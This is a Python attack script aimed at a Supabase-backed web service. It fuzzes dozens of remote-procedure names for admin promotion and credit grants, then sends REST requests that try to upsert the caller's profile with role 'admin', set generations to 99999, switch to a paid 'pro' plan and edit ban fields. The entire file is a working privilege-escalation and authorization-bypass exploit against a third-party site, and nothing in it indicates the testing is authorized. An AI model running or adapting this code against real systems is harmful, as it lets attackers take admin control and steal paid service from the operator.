import ssl, json, urllib.request, urllib.error

BASE = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
ctx = ssl.create_default_context()

def req(method, path, body=None, token=None, extra=None):
    h = {
        "User-Agent": "Mozilla/5.0",
        "apikey": KEY,
        "Authorization": f"Bearer {token or KEY}",
        "X-Client-Info": "supabase-js/2.49.4",
        "Prefer": "return=representation",
        "Content-Type": "application/json;charset=UTF-8",
    }
    if extra:
        h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

session = json.load(open("token.txt"))
access = session["access_token"]
uid = session["user"]["id"]

print("=== role rpc names fuzz ===")
names = [
    "promote_admin", "promote_user", "promote_to_admin", "set_role",
    "set_user_role", "update_user_role", "change_role", "change_user_role",
    "grant_role", "grant_admin_role", "assign_admin", "assign_role",
    "add_admin", "create_admin", "set_admin", "make_user_admin",
    "upgrade_role", "upgrade_to_admin", "admin_promote", "promote",
    "demote", "set_privilege", "update_privilege", "grant_privilege",
    "become_admin", "escalate", "set_admin_flag", "flag_admin",
    "adminify", "set_role_admin", "force_admin", "grant_admin",
    "add_plan", "grant_plan", "give_plan", "assign_plan_credits",
    "grant_generations", "add_generations", "give_credits",
    "credit_user", "refill_credits", "topup_credits", "topup",
    "increase_credits", "decrease_credits", "update_credits",
    "set_credits", "reset_attempts", "admin_set_plan",
    "admin_assign_plan", "admin_plan_grant", "plan_grant",
]
for n in names:
    st, txt = req("POST", f"/rest/v1/rpc/{n}")
    extra = ""
    if st != 404:
        extra = " <<<<<<<<<<< EXISTS/DIFFERENT"
    print(f"rpc/{n} -> {st}{extra}")
    if st != 404:
        print("   ", txt[:250].replace("\n", " "))

print("\n=== upsert role via POST with on_conflict ===")
st, txt = req("POST", "/rest/v1/profiles?on_conflict=user_id",
              body={"user_id": uid, "role": "admin", "email": "rat4080probeewb44z@gmail.com"},
              token=access, extra={"Prefer": "return=representation,resolution=merge-duplicates"})
print(st, txt[:400])

print("\n=== PATCH email (privileged check) ===")
st, txt = req("PATCH", f"/rest/v1/profiles?user_id=eq.{uid}",
              body={"email": "rat4080probeewb44z@gmail.com"}, token=access)
print(st, txt[:300])

print("\n=== PATCH generations_left ===")
st, txt = req("PATCH", f"/rest/v1/profiles?user_id=eq.{uid}",
              body={"generations_left": 99999}, token=access)
print(st, txt[:300])

print("\n=== PATCH activePlan ===")
st, txt = req("PATCH", f"/rest/v1/profiles?user_id=eq.{uid}",
              body={"activePlan": "pro"}, token=access)
print(st, txt[:300])

print("\n=== PATCH banned_by/ban_reason (cleanup own row) ===")
st, txt = req("PATCH", f"/rest/v1/profiles?user_id=eq.{uid}",
              body={"banned_by": "admin@onlyfakeai.ru"}, token=access)
print(st, txt[:300])

print("\n=== rpc is_admin with my token ===")
st, txt = req("POST", "/rest/v1/rpc/is_admin", token=access)
print(st, txt[:200])
